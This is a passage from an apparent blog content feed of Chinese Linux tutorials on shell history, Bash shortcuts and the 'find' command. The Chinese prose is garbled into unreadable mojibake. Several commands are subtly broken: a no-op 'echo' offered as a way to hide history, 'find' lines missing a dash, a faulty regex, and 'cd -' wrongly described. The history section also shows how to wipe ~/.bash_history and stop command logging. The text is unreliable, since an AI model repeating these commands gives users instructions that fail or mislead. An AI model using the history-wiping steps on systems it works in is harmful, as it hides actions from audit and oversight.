id="å»é™¤æ³¨é‡Šå’Œç©ºç™½è¡Œ"><a href="#å»é™¤æ³¨é‡Šå’Œç©ºç™½è¡Œ" class="headerlink" title="å»é™¤æ³¨é‡Šå’Œç©ºç™½è¡Œ"></a>å»é™¤æ³¨é‡Šå’Œç©ºç™½è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> test.conf.bak <span class="token operator">|</span> <span class="token function">grep</span> -v -e <span class="token string">'^#'</span> -e <span class="token string">'^ *#'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^$/d'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x06-Linux-history-æ“ä½œ"><a href="#0x06-Linux-history-æ“ä½œ" class="headerlink" title="0x06 Linux history æ“ä½œ"></a>0x06 Linux history æ“ä½œ</h2><h3 id="éšè—ç»ˆç«¯-history-è®°å½•"><a href="#éšè—ç»ˆç«¯-history-è®°å½•" class="headerlink" title="éšè—ç»ˆç«¯ history è®°å½•"></a>éšè—ç»ˆç«¯ history è®°å½•</h3><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åå°†ä¸å†è®°å½•å†å²å‘½ä»¤ï¼Œå¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼Œé‡å¯å¤±æ•ˆ</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"No History For This"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è®©-history-æ˜¾ç¤ºæ—¶é—´è½´"><a href="#è®©-history-æ˜¾ç¤ºæ—¶é—´è½´" class="headerlink" title="è®© history æ˜¾ç¤ºæ—¶é—´è½´"></a>è®© history æ˜¾ç¤ºæ—¶é—´è½´</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HISTTIMEFORMAT<span class="token operator">=</span><span class="token string">'%F %T '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ¸…ç©º-history"><a href="#æ¸…ç©º-history" class="headerlink" title="æ¸…ç©º history"></a>æ¸…ç©º history</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">history</span> -c<span class="token function">cat</span> /dev/null <span class="token operator">></span> ~/.bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="è®¾ç½®æ°¸ä¹…ä¸è®°å½•"><a href="#è®¾ç½®æ°¸ä¹…ä¸è®°å½•" class="headerlink" title="è®¾ç½®æ°¸ä¹…ä¸è®°å½•"></a>è®¾ç½®æ°¸ä¹…ä¸è®°å½•</h3><p>ç¼–è¾‘ <strong>/etc/profile</strong>ï¼Œå°† <code>HISTSIZE=1000</code> æ”¹æˆ <code>0</code> æˆ– <code>1</code></p><h2 id="0x07-ç»ˆç«¯å‘½ä»¤æŠ€å·§"><a href="#0x07-ç»ˆç«¯å‘½ä»¤æŠ€å·§" class="headerlink" title="0x07 ç»ˆç«¯å‘½ä»¤æŠ€å·§"></a>0x07 ç»ˆç«¯å‘½ä»¤æŠ€å·§</h2><h3 id="äº¤äº’å¼è¾“å…¥"><a href="#äº¤äº’å¼è¾“å…¥" class="headerlink" title="äº¤äº’å¼è¾“å…¥"></a>äº¤äº’å¼è¾“å…¥</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 shell<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat > test.txt &lt;&lt; EOF</span><span class="token operator">></span> 123<span class="token operator">></span> 456<span class="token operator">></span> EOF<span class="token punctuation">[</span>root@centos7 shell<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat test.txt</span>123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨-é‡ç”¨ä¸Šæ¬¡çš„å‘½ä»¤"><a href="#ä½¿ç”¨-é‡ç”¨ä¸Šæ¬¡çš„å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ !! é‡ç”¨ä¸Šæ¬¡çš„å‘½ä»¤"></a>ä½¿ç”¨ !! é‡ç”¨ä¸Šæ¬¡çš„å‘½ä»¤</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> /<span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨-n-é‡ç”¨ç¬¬-n-æ¡å‘½ä»¤"><a href="#ä½¿ç”¨-n-é‡ç”¨ç¬¬-n-æ¡å‘½ä»¤" class="headerlink" title="ä½¿ç”¨ !n é‡ç”¨ç¬¬ n æ¡å‘½ä»¤"></a>ä½¿ç”¨ !n é‡ç”¨ç¬¬ n æ¡å‘½ä»¤</h3><p>ä½¿ç”¨ <code>history</code> æŸ¥çœ‹å‘½ä»¤ç¼–å·</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos7 /<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># history</span>    1  <span class="token function">cat</span> ~/.bash_history    2  <span class="token function">cat</span> ~/.bash_profile    3  <span class="token function">cat</span> ~/.bash_logout    4  <span class="token function">clear</span>    5  <span class="token function">ls</span>    6  <span class="token function">pwd</span><span class="token punctuation">[</span>root@centos7 /<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># !5</span><span class="token function">ls</span>bin   dev  home  lib64  mnt  proc  run   srv  tmp  varboot  etc  lib   media  opt  root  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨-é‡ç”¨ä¸Šæ¬¡å‘½ä»¤ä¸­çš„å‚æ•°"><a href="#ä½¿ç”¨-é‡ç”¨ä¸Šæ¬¡å‘½ä»¤ä¸­çš„å‚æ•°" class="headerlink" title="ä½¿ç”¨ !$ é‡ç”¨ä¸Šæ¬¡å‘½ä»¤ä¸­çš„å‚æ•°"></a>ä½¿ç”¨ !$ é‡ç”¨ä¸Šæ¬¡å‘½ä»¤ä¸­çš„å‚æ•°</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> Test/<span class="token function">cd</span> <span class="token operator">!</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä½¿ç”¨-è·å–ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœ"><a href="#ä½¿ç”¨-è·å–ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœ" class="headerlink" title="ä½¿ç”¨ $? è·å–ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœ"></a>ä½¿ç”¨ $? è·å–ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœ</h3><p><strong>$?</strong> ç»“æœä¸º 0 è¡¨ç¤º âœ…</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status httpd<span class="token keyword">echo</span> <span class="token variable">$?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="é‡æ–°è¿è¡Œæœ€åä¸€ä¸ªç»ˆç«¯å‘½ä»¤"><a href="#é‡æ–°è¿è¡Œæœ€åä¸€ä¸ªç»ˆç«¯å‘½ä»¤" class="headerlink" title="é‡æ–°è¿è¡Œæœ€åä¸€ä¸ªç»ˆç«¯å‘½ä»¤"></a>é‡æ–°è¿è¡Œæœ€åä¸€ä¸ªç»ˆç«¯å‘½ä»¤</h3><p>ä½¿ç”¨ <strong>sudo</strong> è¿è¡Œæœ€åä¸€ä¸ªå‘½ä»¤</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="åˆ‡æ¢æ–‡ä»¶è·¯å¾„çš„å¿«æ·æ–¹å¼"><a href="#åˆ‡æ¢æ–‡ä»¶è·¯å¾„çš„å¿«æ·æ–¹å¼" class="headerlink" title="åˆ‡æ¢æ–‡ä»¶è·¯å¾„çš„å¿«æ·æ–¹å¼"></a>åˆ‡æ¢æ–‡ä»¶è·¯å¾„çš„å¿«æ·æ–¹å¼</h3><table><thead><tr><th><strong>å‘½ä»¤</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>cd ../</td><td>ä¸Šç§»ä¸€ä¸ªç›®å½•</td></tr><tr><td>cd ~</td><td>ç§»åŠ¨åˆ°ç”¨æˆ·çš„ä¸»ç›®å½•</td></tr><tr><td>cd /</td><td>ç§»åŠ¨åˆ°æ ¹ç›®å½•</td></tr><tr><td>cd -</td><td>ç§»åŠ¨åˆ°ç”¨æˆ·çš„ä¸»ç›®å½•</td></tr><tr><td>cd</td><td>ç§»åŠ¨åˆ°ç”¨æˆ·çš„ä¸»ç›®å½•</td></tr></tbody></table><h3 id="å°†ç»ˆç«¯ä¼šè¯è®°å½•ä¸ºæ–‡ä»¶"><a href="#å°†ç»ˆç«¯ä¼šè¯è®°å½•ä¸ºæ–‡ä»¶" class="headerlink" title="å°†ç»ˆç«¯ä¼šè¯è®°å½•ä¸ºæ–‡ä»¶"></a>å°†ç»ˆç«¯ä¼šè¯è®°å½•ä¸ºæ–‡ä»¶</h3><p>æœ‰æ—¶æ‚¨å¯èƒ½å¸Œæœ›å°†æ‰€æœ‰ç»ˆç«¯è¾“å‡ºå­˜å‚¨åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç¨åæ‚¨å¯ä»¥å‚è€ƒè¯¥æ–‡ä»¶ï¼Œè€Œâ€œ<strong>script</strong>â€å‘½ä»¤å¯ä»¥è®©æ‚¨åšåˆ°è¿™ä¸€ç‚¹ã€‚å®ƒä¼šåœ¨æ‚¨çš„ç»ˆç«¯ä¼šè¯ä¸­åˆ›å»ºæ‰€æœ‰å†…å®¹çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ç»ˆç«¯æ•°æ®ä»¥åŸå§‹å½¢å¼å­˜å‚¨åœ¨æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæœ‰å…³è®¡æ—¶çš„ä¿¡æ¯å­˜å‚¨åœ¨å¦ä¸€ä¸ªï¼ˆå¯é€‰ï¼‰ç»“æ„åŒ–æ—¥å¿—æ–‡ä»¶ä¸­ã€‚<br>è¦å¼€å§‹å½•åˆ¶ï¼Œæ‚¨åªéœ€åœ¨ç»ˆç«¯ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">$ script<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¦åœæ­¢å½•åˆ¶ï¼Œè¾“å…¥ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€€å‡ºåï¼Œæ‚¨åº”è¯¥åœ¨<strong>script</strong>å¯åŠ¨çš„ç›®å½•ä¸­æ‰¾åˆ°ä¸€ä¸ªåä¸ºâ€œ<strong>typescript</strong>â€çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶æ‰“å°åˆ°ç»ˆç«¯ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ‚¨åœ¨ç»ˆç«¯ä¸Šè¾“å…¥çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„è¾“å‡ºï¼<br>â€‹</p><h2 id="0x08-é‡å‘½å-ç§»åŠ¨å¸¦åç¼€çš„æ–‡ä»¶"><a href="#0x08-é‡å‘½å-ç§»åŠ¨å¸¦åç¼€çš„æ–‡ä»¶" class="headerlink" title="0x08 é‡å‘½å/ç§»åŠ¨å¸¦åç¼€çš„æ–‡ä»¶"></a>0x08 é‡å‘½å/ç§»åŠ¨å¸¦åç¼€çš„æ–‡ä»¶</h2><p>å¦‚æœä½ æƒ³é€šè¿‡ç»™å®ƒä»¬æ·»åŠ åç¼€æ¥å¿«é€Ÿé‡å‘½åæŸäº›æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">ls</span>result.txt$ <span class="token function">cp</span> ./result.txt<span class="token punctuation">{</span>,.bak<span class="token punctuation">}</span>$ <span class="token function">ls</span>result.txt result.txt.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“åˆä¸€äº›æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™ä¼šéå¸¸æ–¹ä¾¿ï¼Œå°¤å…¶æ˜¯åœ¨é‡å‘½åå¤§é‡æ–‡ä»¶æ—¶ã€‚<br>â€‹</p><h2 id="0x09-Bash-å¸¸ç”¨å¿«æ·é”®"><a href="#0x09-Bash-å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="0x09 Bash å¸¸ç”¨å¿«æ·é”®"></a>0x09 Bash å¸¸ç”¨å¿«æ·é”®</h2><table><thead><tr><th><strong>å¿«æ·é”®</strong></th><th><strong>ä½œ ç”¨</strong></th></tr></thead><tbody><tr><td>Ctrl+A</td><td>æŠŠå…‰æ ‡ç§»åŠ¨åˆ°å‘½ä»¤è¡Œå¼€å¤´ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤è¿‡é•¿ï¼Œåˆ™åœ¨æƒ³è¦æŠŠå…‰æ ‡ç§»åŠ¨åˆ°å‘½ä»¤è¡Œå¼€å¤´æ—¶ä½¿ç”¨</td></tr><tr><td>Ctrl+E</td><td>æŠŠå…‰æ ‡ç§»åŠ¨åˆ°å‘½ä»¤è¡Œç»“å°¾</td></tr><tr><td>Ctrl+C</td><td>å¼ºåˆ¶ä¸­æ­¢å½“å‰çš„å‘½ä»¤</td></tr><tr><td>Ctrl+L</td><td>æ·¸å±ï¼Œç›¸å½“äº clear å‘½ä»¤</td></tr><tr><td>Ctrl+U</td><td>åˆªé™¤æˆ–å‰ªåˆ‡å…‰æ ‡ä¹‹å‰çš„å‘½ä»¤ã€‚å‡è®¾è¾“å…¥äº†ä¸€è¡Œå¾ˆé•¿çš„å‘½ä»¤ï¼Œæ— é¡»ä½¿ç”¨é€€æ ¼é”®ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦åœ°åˆªé™¤ï¼Œ ä½¿ç”¨è¿™ä¸ªå¿«æ·é”®ä¼šæ›´åŠ æ–¹ä¾¿</td></tr><tr><td>Ctrl+K</td><td>åˆ é™¤æˆ–å‰ªåˆ‡å…‰æ ‡ä¹‹åçš„å†…å®¹</td></tr><tr><td>Qrl+Y</td><td>ç²˜è´´ Ctrl+U æˆ– Ctrl+K å‰ªåˆ‡çš„å†…å®¹</td></tr><tr><td>Ctrl+R</td><td>åœ¨å†å²å‘½ä»¤ä¸­æœç´¢ï¼ŒæŒ‰ä¸‹ Ctrl+R ç»„åˆé”®ä¹‹åï¼Œå°±ä¼šå‡ºç°æœç´¢ç•Œé¢ï¼Œåªè¦è¾“å…¥æœç´¢å†…å®¹ï¼Œå°±ä¼šä»å†å²å‘½ä»¤ä¸­æœç´¢</td></tr><tr><td>Ctrl+D</td><td>é€€å‡ºå½“å‰ç»ˆç«¯</td></tr><tr><td>Ctrl+Z</td><td>æš‚åœï¼Œå¹¶æ”¾å…¥åå°ã€‚è¿™ä¸ªå¿«æ·é”®æ¶‰åŠå·¥ä½œç®¡ç†çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¼šåœ¨åç»­ä¸­è¯¦ç»†ä»‹ç»</td></tr><tr><td>Ctrl+S</td><td>æš‚åœå±å¹•è¾“å‡º</td></tr><tr><td>Ctrl+Q</td><td>æ¢å¤å±å¹•è¾“å‡º</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ–‡æœ¬å¤„ç†</title>
      <link href="/post/9f04c795.html"/>
      <url>/post/9f04c795.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-æ–‡æœ¬å¤„ç†"><a href="#Linux-æ–‡æœ¬å¤„ç†" class="headerlink" title="Linux æ–‡æœ¬å¤„ç†"></a>Linux æ–‡æœ¬å¤„ç†</h1><h2 id="ä¸€ã€find-æ–‡ä»¶æŸ¥æ‰¾"><a href="#ä¸€ã€find-æ–‡ä»¶æŸ¥æ‰¾" class="headerlink" title="ä¸€ã€find æ–‡ä»¶æŸ¥æ‰¾"></a>ä¸€ã€find æ–‡ä»¶æŸ¥æ‰¾</h2><h3 id="åŸºæœ¬æŸ¥æ‰¾"><a href="#åŸºæœ¬æŸ¥æ‰¾" class="headerlink" title="åŸºæœ¬æŸ¥æ‰¾"></a>åŸºæœ¬æŸ¥æ‰¾</h3><p>æŸ¥æ‰¾**.txt<strong>å’Œ</strong>.pdf**æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> \<span class="token punctuation">(</span> -name <span class="token string">"*.txt"</span> -o -name <span class="token string">"*.pdf"</span> \<span class="token punctuation">)</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­£åˆ™æ–¹å¼æŸ¥æ‰¾**.txt<strong>å’Œ</strong>.pdf**æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -regex <span class="token string">".*.[txt|pdf]$"</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-iregexï¼š å¿½ç•¥å¤§å°å†™çš„æ­£åˆ™</p></blockquote><p>â€‹</p><p>å¦å®šå‚æ•°ï¼ŒæŸ¥æ‰¾æ‰€æœ‰é <strong>.txt</strong> æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> <span class="token operator">!</span> -name <span class="token string">"*.txt"</span> -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŒ‡å®š<strong>æœç´¢æ·±åº¦</strong>ï¼Œæ‰“å°å‡ºå½“å‰ç›®å½•çš„æ–‡ä»¶ï¼ˆæ·±åº¦ä¸º 1ï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å®šåˆ¶æœç´¢"><a href="#å®šåˆ¶æœç´¢" class="headerlink" title="å®šåˆ¶æœç´¢"></a>å®šåˆ¶æœç´¢</h3><h4 id="æŒ‰ç±»å‹æœç´¢"><a href="#æŒ‰ç±»å‹æœç´¢" class="headerlink" title="æŒ‰ç±»å‹æœç´¢"></a>æŒ‰ç±»å‹æœç´¢</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -print  // åªåˆ—å‡ºæ‰€æœ‰æ–‡ä»¶<span class="token function">find</span> <span class="token keyword">.</span> -type d -print  // åªåˆ—å‡ºæ‰€æœ‰ç›®å½•<span class="token function">find</span> <span class="token keyword">.</span> -type l -print  // åªåˆ—å‡ºæ‰€æœ‰ç¬¦å·é“¾æ¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>-type f æ–‡ä»¶ / l ç¬¦å·é“¾æ¥ / d ç›®å½•</p></blockquote><p>â€‹</p><p>find æ”¯æŒçš„æ–‡ä»¶æ£€ç´¢ç±»å‹å¯ä»¥åŒºåˆ†æ™®é€šæ–‡ä»¶å’Œç¬¦å·é“¾æ¥ã€ç›®å½•ç­‰ï¼Œä½†æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶å’Œæ–‡æœ¬æ–‡ä»¶æ— æ³•ç›´æ¥é€šè¿‡ find çš„ç±»å‹åŒºåˆ†å‡ºæ¥ï¼›<br>file å‘½ä»¤å¯ä»¥æ£€æŸ¥æ–‡ä»¶å…·ä½“ç±»å‹ï¼ˆäºŒè¿›åˆ¶æˆ–æ–‡æœ¬ï¼‰:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># file /bin/vim</span>/bin/vim: ELF 64-bit LSB executable, x86-64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked <span class="token punctuation">(</span>uses shared libs<span class="token punctuation">)</span>, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>70d3b3bb75c8d735239f78142d00686c8a6a53dd, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤ç»„åˆæ¥å®ç°æŸ¥æ‰¾æœ¬åœ°ç›®å½•ä¸‹çš„<strong>æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$9</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">file</span><span class="token operator">|</span><span class="token function">grep</span> ELF<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span><span class="token operator">|</span><span class="token function">tr</span> -d <span class="token string">':'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‰æ—¶é—´æœç´¢"><a href="#æŒ‰æ—¶é—´æœç´¢" class="headerlink" title="æŒ‰æ—¶é—´æœç´¢"></a>æŒ‰æ—¶é—´æœç´¢</h4><ul><li>-atime è®¿é—®æ—¶é—´ï¼ˆå•ä½æ˜¯å¤©ï¼Œåˆ†é’Ÿå•ä½åˆ™æ˜¯ aminï¼Œä»¥ä¸‹ç±»ä¼¼ï¼‰</li><li>mtime ä¿®æ”¹æ—¶é—´ï¼ˆå†…å®¹æœ€åè¢«ä¿®æ”¹çš„æ—¶é—´ï¼‰</li><li>ctime å˜åŒ–æ—¶é—´ï¼ˆå…ƒæ•°æ®æˆ–æƒé™å˜åŒ–ï¼‰</li></ul><p><strong>æœ€è¿‘ç¬¬ 7 å¤©</strong>è¢«è®¿é—®è¿‡çš„æ‰€æœ‰æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime 7 -type f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p><strong>æœ€è¿‘ 7 å¤©</strong>è¢«è®¿é—®è¿‡çš„æ‰€æœ‰æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime -7 -type f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŸ¥è¯¢<strong>7 å¤©å‰</strong>è¢«è®¿é—®è¿‡çš„æ‰€æœ‰æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -atime +7 <span class="token function">type</span> f -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‰å¤§å°æœç´¢"><a href="#æŒ‰å¤§å°æœç´¢" class="headerlink" title="æŒ‰å¤§å°æœç´¢"></a>æŒ‰å¤§å°æœç´¢</h4><p>å¯»æ‰¾<strong>å¤§äº 2k</strong>çš„æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -size +2k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‰æƒé™æŸ¥æ‰¾"><a href="#æŒ‰æƒé™æŸ¥æ‰¾" class="headerlink" title="æŒ‰æƒé™æŸ¥æ‰¾"></a>æŒ‰æƒé™æŸ¥æ‰¾</h4><p>æŸ¥æ‰¾<strong>æƒé™ä¸º 644</strong>çš„æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -perm 644 -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æŒ‰ç”¨æˆ·æŸ¥æ‰¾"><a href="#æŒ‰ç”¨æˆ·æŸ¥æ‰¾" class="headerlink" title="æŒ‰ç”¨æˆ·æŸ¥æ‰¾"></a>æŒ‰ç”¨æˆ·æŸ¥æ‰¾</h4><p>æŸ¥æ‰¾<strong>ç”¨æˆ· truda</strong>æ‰€æ‹¥æœ‰çš„æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -user truda -print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ‰¾åˆ°åçš„åç»­æ“ä½œ"><a href="#æ‰¾åˆ°åçš„åç»­æ“ä½œ" class="headerlink" title="æ‰¾åˆ°åçš„åç»­æ“ä½œ"></a>æ‰¾åˆ°åçš„åç»­æ“ä½œ</h3><h4 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h4><p><strong>åˆ é™¤</strong>å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰<strong>txt æ–‡ä»¶</strong>ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -name <span class="token string">"*.txt"</span> -delete<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦ä¸€ç§è¯­æ³•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> <span class="token function">type</span> f -name <span class="token string">"*.txt"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ‰§è¡ŒåŠ¨ä½œï¼ˆexecï¼‰"><a href="#æ‰§è¡ŒåŠ¨ä½œï¼ˆexecï¼‰" class="headerlink" title="æ‰§è¡ŒåŠ¨ä½œï¼ˆexecï¼‰"></a>æ‰§è¡ŒåŠ¨ä½œï¼ˆexecï¼‰</h4><p>å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æƒä¸º root çš„æ–‡ä»¶å˜æ›´æ‰€æœ‰æƒä¸º trudaï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -user root -exec <span class="token function">chown</span> truda <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨ï¼š<code>{}</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œå¯¹äºæ¯ä¸€ä¸ªåŒ¹é…çš„æ–‡ä»¶ï¼Œ<code>{}</code>ä¼šè¢«æ›¿æ¢æˆç›¸åº”çš„æ–‡ä»¶åï¼›</p></blockquote><p>å°†æ‰¾åˆ°çš„æ–‡ä»¶å…¨éƒ¨ copy åˆ°å¦ä¸€ä¸ªç›®å½•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> <span class="token keyword">.</span> -type f -mtime +10 -name <span class="token string">"*.txt"</span> -exec <span class="token function">cp</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> OLD \<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç»“åˆå¤šä¸ªå‘½ä»¤"><a href="#ç»“åˆå¤šä¸ªå‘½ä»¤" class="headerlink" title="ç»“åˆå¤šä¸ªå‘½ä»¤"></a>ç»“åˆå¤šä¸ªå‘½ä»¤</h4><p>å¦‚æœéœ€è¦åç»­æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥å°†å¤šä¸ªå‘½ä»¤å†™æˆä¸€ä¸ªè„šæœ¬ï¼Œç„¶å -exec è°ƒç”¨æ—¶æ‰§è¡Œè„šæœ¬å³å¯ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">-exec ./commands.sh <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="print-çš„ç•Œå®šç¬¦"><a href="#print-çš„ç•Œå®šç¬¦" class="headerlink" title="-print çš„ç•Œå®šç¬¦"></a>-print çš„ç•Œå®šç¬¦</h3><p>é»˜è®¤ä½¿ç”¨â€œ\nâ€ä½œä¸ºæ–‡ä»¶çš„ç•Œå®šç¬¦ï¼›<br>-print 0 ä½¿ç”¨â€œ\0â€ä½œä¸ºæ–‡ä»¶çš„å®šç•Œç¬¦ï¼Œè¿™æ ·å°±å¯ä»¥æœç´¢åŒ…å«ç©ºæ ¼çš„æ–‡ä»¶ï¼›<br>â€‹</p><h2 id="äºŒã€grep-æ–‡æœ¬æœç´¢"><a href="#äºŒã€grep-æ–‡æœ¬æœç´¢" class="headerlink" title="äºŒã€grep æ–‡æœ¬æœç´¢"></a>äºŒã€grep æ–‡æœ¬æœç´¢</h2><h3 